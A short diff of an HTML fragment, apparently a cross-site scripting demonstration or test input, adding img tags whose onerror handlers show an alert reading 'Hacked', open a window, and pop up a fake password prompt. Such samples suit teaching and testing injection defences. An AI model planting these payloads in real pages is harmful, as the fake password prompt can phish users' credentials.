@@ -1,1 +1,4 @@
-<img onerror= 'window.prompt("Please enter your password", "********");’ src =‘garbage’/>
+<h1 style = font-size:10rem>This is big…</h1>
+<img onerror='alert("Hacked");' src='invalid-image' />
+<img onerror='window.open("http://www.google.com");' src='invalid-image' />
+<img onerror='window.prompt("Please enter your password", "********");’ src =‘garbage’/>
